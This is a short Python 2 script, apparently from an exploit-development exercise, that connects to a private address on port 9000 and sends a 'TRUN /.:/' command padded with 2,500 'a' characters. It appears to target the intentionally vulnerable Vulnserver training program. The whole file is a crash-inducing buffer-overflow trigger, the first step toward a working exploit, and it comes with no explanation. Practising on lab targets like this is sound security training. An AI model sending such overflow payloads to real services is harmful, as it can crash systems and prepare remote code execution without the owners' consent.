import sys, socket
buffer = "TRUN /.:/"
buffer += "a" * 2500

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.2.17', 9000))
print s.recv(1024)
s.send(buffer)
s.close()



